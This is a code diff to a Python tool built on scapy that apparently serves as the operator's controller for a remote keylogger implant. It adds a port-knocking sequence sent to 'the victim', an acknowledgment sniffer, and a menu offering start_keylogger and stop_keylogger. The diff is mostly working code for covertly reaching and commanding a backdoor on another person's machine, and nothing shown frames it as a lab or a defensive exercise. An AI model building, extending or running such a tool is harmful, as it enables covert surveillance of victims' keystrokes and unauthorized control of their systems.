@@ -1,7 +1,7 @@
 import os
 import base64
 import threading
-from scapy.all import sniff, TCP
+from scapy.all import sniff, TCP, send, IP
 import sys
 import socket
 import time
@@ -12,6 +12,8 @@ current_signal = None
 sniffing = False
 dest_ip = None
 sniffing_event = threading.Event()
+ack_event = threading.Event()
+timeout = 10  # Timeout in seconds for acknowledgment
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -179,10 +181,51 @@ def run_async_task(task):
     """Run a task asynchronously."""
     threading.Thread(target=task).start()
 
+def send_knock_sequence(dest_ip, sequence):
+    """Send the port-knocking sequence to the victim."""
+    # Send knock sequence
+    for port in sequence:
+        port = int(port)
+        send_packet(dest_ip, port)
+        time.sleep(1)
+    
+    print("Waiting for acknowledgment...")
+    # Simple acknowledgment check - just look for SYN-ACK
+    response = sniff(filter=f"tcp and src host {dest_ip} and tcp[tcpflags] & (tcp-syn|tcp-ack) != 0", 
+                    count=1, 
+                    timeout=timeout)
+    
+    if response:
+        print("Received acknowledgment. Continuing...")
+    else:
+        print("No acknowledgment received. Exiting.")
+        sys.exit(1)
+
+def send_packet(dest_ip, port):
+    """Send a TCP packet to the specified port."""
+    ip = IP(dst=dest_ip)
+    tcp = TCP(dport=port, flags="S")
+    packet = ip/tcp
+    send(packet)
+
+def ack_callback(packet):
+    """Callback function to handle acknowledgment packets."""
+    if packet.haslayer(TCP) and packet[TCP].flags & 0x12:  # SYN-ACK flags
+        ack_event.set()
+
 def main():
     """Main function to handle user input and execute corresponding actions."""
     global current_signal, dest_ip
     dest_ip = input("Enter the destination IP for sending signals: ")
+    knock_sequence = input("Enter the port-knocking sequence (comma-separated): ").split(",")
+
+    # Start sniffing for acknowledgment packets
+    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and src host {dest_ip}", 'prn': ack_callback, 'store': 0})
+    sniff_thread.start()
+
+    # Send the port-knocking sequence
+    send_knock_sequence(dest_ip, knock_sequence)
+
     options = {
         "1": start_keylogger,
         "2": stop_keylogger,
